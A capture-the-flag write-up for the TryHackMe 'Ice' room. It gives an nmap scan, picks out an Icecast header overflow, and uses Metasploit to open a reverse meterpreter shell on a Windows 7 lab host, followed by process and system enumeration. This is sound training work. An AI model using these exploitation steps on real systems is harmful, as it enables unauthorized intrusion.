# TryHackMe ICE Write-up

A walkthrough of a Windows-based TryHackMeCTF.
https://tryhackme.com/room/ice

## Recon

### Nmap scan

- Windows machine
- Multiple open services
- SMB open
- Icecast media streaming server open
- Quite a few open RPC services
- A HTTP API
- Remote desktop (read as `ms-wbt-server`)
- Hostname enumerated as `DARK-PC` from SMB.

```shell
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-30 20:45 BST
Nmap scan report for 10.10.70.52
Host is up (0.021s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-09-30T19:46:14+00:00; 0s from scanner time.
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
8000/tcp  open  http               Icecast streaming media server
|_http-title: Site doesn\'t have a title (text/html).
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h15m00s, deviation: 2h30m00s, median: 0s
|_nbstat: NetBIOS name: DARK-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:9d:da:4c:eb:f7 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Dark-PC
|   NetBIOS computer name: DARK-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-09-30T14:46:09-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-30T19:46:08
|_  start_date: 2020-09-30T19:43:59

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 126.36 seconds

```

## Gaining Access

### Finding an Icecast vuln

We can find a vuln on CVEDetails.

There isn't much in terms of versioning that the nmap scan has given us. 
So we'll have to guess at the CVE that TryHackMe is referring to.

Order results by vulns criticality over 7.
There are no explicitally matching _types_ of vulns.
But, with some common sense we can determine the bug we're looking for is:
`execute code overflow`

Of which, CVE `CVE-2004-1561` is one of the vuln opportunities.

### Metasploit

For this CTF, we're asked to use metasploit.

```shell
msf5 > search icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite
```

We're potentially lucky in that we've only got one option.
Lets hope it works. And `use 0`, we'll want to set up as appropriate too.

```shell
msf5 exploit(windows/http/icecast_header) > options

Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.70.52      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)

Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(windows/http/icecast_header) > run

[*] Started reverse TCP handler on 10.11.8.219:4444
[*] Meterpreter session 1 opened (10.11.8.219:4444 -> 10.10.70.52:49261) at 2020-09-30 22:04:29 +0100

meterpreter>
```

Great, we have a meterpreter session after exploiting the Icecast service.

## Escalation

Now that we've got a `meterpreter` shell, we can start enumerating the system.

We can check what processes are running, and who is running them with `ps`.

```shell
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 416   4     smss.exe
 500   692   svchost.exe
 544   536   csrss.exe
 588   692   svchost.exe
 592   536   wininit.exe
 604   584   csrss.exe
 652   584   winlogon.exe
 692   592   services.exe
 700   592   lsass.exe
 708   592   lsm.exe
 816   692   svchost.exe
 884   692   svchost.exe
 932   692   svchost.exe
 1056  692   svchost.exe
 1140  692   svchost.exe
 1260  692   spoolsv.exe
 1292  692   sppsvc.exe
 1324  692   svchost.exe
 1408  692   taskhost.exe          x64   1        Dark-PC\Dark  C:\Windows\System32\taskhost.exe
 1516  500   dwm.exe               x64   1        Dark-PC\Dark  C:\Windows\System32\dwm.exe
 1528  1496  explorer.exe          x64   1        Dark-PC\Dark  C:\Windows\explorer.exe
 1568  692   amazon-ssm-agent.exe
 1704  692   LiteAgent.exe
 1744  692   svchost.exe
 1800  816   WmiPrvSE.exe
 1884  692   Ec2Config.exe
 2076  692   svchost.exe
 2204  692   vds.exe
 2260  1528  Icecast2.exe          x86   1        Dark-PC\Dark  C:\Program Files (x86)\Icecast2 Win32\Icecast2.exe
 2508  692   SearchIndexer.exe
 3024  692   TrustedInstaller.exe
 4004  816   slui.exe              x64   1        Dark-PC\Dark  C:\Windows\System32\slui.exe

meterpreter >
```

We can enumerate some system info with `sysinfo`.

```shell
meterpreter> sysinfo
Computer        : DARK-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter >
```

OS is Windows 7, build `7601`. On `x64` architecture.

We can further enumerate with a some `post` exploitations on our meterpreter shell.
Lets use `post/multi/recon/local_exploit_suggester`.







